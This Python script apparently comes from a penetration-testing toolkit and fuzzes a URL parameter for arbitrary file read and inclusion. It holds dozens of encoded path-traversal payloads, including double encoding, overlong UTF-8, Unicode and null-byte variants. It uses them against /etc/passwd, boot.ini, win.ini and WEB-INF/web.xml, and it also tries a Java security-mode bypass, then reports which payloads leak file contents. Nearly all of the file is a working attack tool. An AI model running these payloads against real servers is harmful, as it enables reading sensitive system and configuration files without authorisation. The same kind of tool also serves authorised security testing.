#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 任意文件读取/包含FUZZ检测
referer: unknown
author: Lucifer
description: 对windows和linux主机的敏感文件进行任意文件包含和读取FUZZ。
'''
import sys
import requests
import warnings
from termcolor import cprint

class arbitrarily_filefuzz_check_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        key = "FUZZING"
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        allpayloads = [
            "../",
            "..%2f",
            "%2e%2e/",
            "%2e%2e%2f",
            "..%252f",
            "%252e%252e/",
            "..\\",
            "..%255c",
            "..%5c..%5c",
            "%2e%2e\\",
            "%2e%2e%5c",
            "%252e%252e\\",
            "%252e%252e%255c",
            "..%c0%af",
            "%c0%ae%c0%ae/",
            "%c0%ae%c0%ae%c0%af",
            "..%25c0%25af",
            "%25c0%25ae%25c0%25ae/",
            "..%c1%9c",
            "%c0%ae%c0%ae\\",
            "%c0%ae%c0%ae%c1%9c",
            "..%25c1%259c",
            "%25c0%25ae%25c0%25ae\\",
            "..%%32%66",
            "%%32%65%%32%65/",
            "..%%35%63",
            "..\\",
            "..%5c",
            "%2e%2e\\",
            "\\../",
            "/..\\",
            ".../",
            "..../",
            "....\\",
            "..%u2215",
            "%uff0e%uff0e/",
            "%uff0e%uff0e%u2215",
            "..%u2216",
            "..%uEFC8",
            "..%uF025",
            "%uff0e%uff0e\\",
            "%uff0e%uff0e%u2216",
            "..0x2f",
            "0x2e0x2e/",
            "..0x5c",
            "0x2e0x2e\\",
            "..%c0%2f",
            "%c0%2e%c0%2e/",
            "%c0%2e%c0%2e%c0%2f",
            "..%c0%5c",
            "%c0%2e%c0%2e\\",
            "%c0%2e%c0%2e%c0%5c",
            "..//",
            "..///",
            "..\\\\",
            "..\\\\\\",
            "./\\/./",
            ".\\/\\.\\",
            "./../",
            ".\\..\\",
            ".//..//",
            ".\\\\..\\\\",
            "\\..%2f",
        ]
        linux_file = [
            "etc/passwd",
            "etc/passwd%00.jpg"
        ]
        windows_file = [
            "c:\\boot.ini",
            "file://c:\\windows\\win.ini"
        ]
        java_file = [
            "WEB-INF/web.xml"
        ]

        if self.url.find("FUZZING") is -1:
            cprint(">>执行Java安全模式绕过路径穿越扫描..", "cyan")
            payload = "/%c0%ae"
            for count in range(1,11):
                fuzzurl = self.url + payload*count + "/WEB-INF/web.xml"
                req = requests.get(fuzzurl, headers=headers, timeout=6, verify=False)
                if req.headers["Content-Type"] == "application/xml":
                    cprint("[+]"+"存在java安全模式绕过漏洞..\tpayload: "+fuzzurl, "red")
                    break
            payload = "/%c0%ae%c0%ae"
            for count in range(1,11):
                fuzzurl = self.url + payload*count + "/WEB-INF/web.xml"
                req = requests.get(fuzzurl, headers=headers, timeout=6, verify=False)
                if req.headers["Content-Type"] == "application/xml":
                    cprint("[+]"+"存在java安全模式绕过漏洞..\tpayload: "+fuzzurl, "red")
                    break
        else:
            cprint(">>执行Linux路径穿越扫描..", "cyan")

            #---------------------#
            #   Linux  Fuzz       #
            #---------------------#
            #单个payload
            for payload in linux_file:
                payload = "/" + payload
                fuzzurl = self.url.replace("FUZZING", payload)
                req = requests.get(fuzzurl, headers=headers, timeout=6, verify=False)
                if r"root:" in req.text and r"/bin/bash" in req.text:
                    cprint("[+]"+"存在任意文件读取[下载/包含]漏洞..\tpayload: "+fuzzurl, "red")
                    break
            flag = 0
            #多个payload
            for count in range(1,11):
                for linuxfile in linux_file:
                    for linuxpayload in allpayloads:
                        flag=flag+1
                        sys.stdout.write(">>攻击进度: ["+str(flag)+"/1800]"+" "*20+"\r")
                        sys.stdout.flush()
                        payload = count*linuxpayload+linuxfile
                        fuzzurl = self.url.replace("FUZZING", payload)
                        req = requests.get(fuzzurl, headers=headers, timeout=6, verify=False)
                        if r"root:" in req.text and r"/bin/bash" in req.text:
                            cprint("[+]"+"存在任意文件读取[下载/包含]漏洞..\tpayload: "+fuzzurl, "red")
                            break
                    continue
                continue

            cprint(">>执行Windows路径穿越扫描..", "cyan")
            #---------------------#
            #   Windows  Fuzz     #
            #---------------------#
            #单个payload
            for payload in windows_file:
                fuzzurl = self.url.replace("FUZZING", payload)
                req = requests.get(fuzzurl, headers=headers, timeout=6, verify=False)
                if r"[boot loader]" in req.text or r"MPEGVideo" in req.text:
                    cprint("[+]"+"存在任意文件读取[下载/包含]漏洞..\tpayload: "+fuzzurl, "red")
            
            cprint(">>执行javaweb路径穿越扫描..", "cyan")
            #---------------------#
            #   JAVA  Fuzz        #
            #---------------------#
            #单个payload
            for payload in java_file:
                payload = "/" + payload
                fuzzurl = self.url.replace("FUZZING", payload)
                req = requests.get(fuzzurl, headers=headers, timeout=6, verify=False)
                if r"<?xml version=" in req.text and r"<context-param>" in req.text:
                    cprint("[+]"+"存在任意文件读取[下载/包含]漏洞..\tpayload: "+fuzzurl, "red")
                    break

            #多个payload
            flag = 0
            for count in range(1,11):
                for javafile in java_file:
                    for javapayload in allpayloads:
                        flag = flag + 1
                        sys.stdout.write(">>攻击进度: ["+str(flag)+"/640]"+" "*20+"\r")
                        sys.stdout.flush()
                        payload = count*javapayload+javafile
                        fuzzurl = self.url.replace("FUZZING", payload)
                        req = requests.get(fuzzurl, headers=headers, timeout=6, verify=False)
                        if req.headers["Content-Type"] == "application/xml":
                            cprint("[+]"+"存在任意文件读取[下载/包含]漏洞..\tpayload: "+fuzzurl, "red")
                            break
                    continue
                continue


if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    if len(sys.argv) < 2:
        cprint("usage: python3 arbitrarily_filefuzz_check.py http://test.com/download.php?file=FUZZING", "cyan")
        cprint("[*]将需要测试文件操作参数替换为FUZZING即可", "cyan")
    else:
        testVuln = arbitrarily_filefuzz_check_BaseVerify(sys.argv[1])
        testVuln.run()
